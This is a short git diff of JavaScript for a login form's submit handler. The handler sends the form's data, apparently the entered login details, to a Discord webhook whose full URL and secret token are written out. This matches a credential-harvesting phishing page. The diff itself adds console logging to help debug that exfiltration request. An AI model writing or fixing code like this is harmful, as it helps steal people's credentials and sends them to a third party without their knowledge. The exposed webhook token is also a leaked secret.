@@ -20,6 +20,8 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         ]
     };
 
+    console.log('Sending data to Discord:', data);
+
     fetch('https://discord.com/api/webhooks/1558964430836990175/RnRA4zY8n88DU_GAy6V4624zovlkm3Hj6rQSxOmz_Z3xLJUSjqLVa_ie-m198jW5Av02', {
         method: 'POST',
         headers: {
@@ -28,7 +30,10 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         },
         body: JSON.stringify(data)
     })
-    .then(response => response.json())
+    .then(response => {
+        console.log('Response status:', response.status);
+        return response.json();
+    })
     .then(data => {
         console.log('Success:', data);
     })
